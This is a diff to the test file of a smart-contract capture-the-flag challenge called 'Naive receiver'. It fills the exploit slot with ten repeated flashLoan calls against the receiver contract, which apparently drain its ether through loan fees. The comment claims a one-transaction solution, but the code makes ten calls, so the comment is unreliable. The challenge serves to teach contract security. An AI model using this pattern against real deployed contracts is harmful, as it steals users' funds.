@@ -30,7 +30,19 @@ describe('[Challenge] Naive receiver', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        /** CODE YOUR EXPLOIT HERE */
+        // quick and dirty write a one transaction solution 
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+        await this.pool.flashLoan(this.receiver.address, ethers.BigNumber.from(ETHER_IN_RECEIVER));
+
     });
 
     after(async function () {
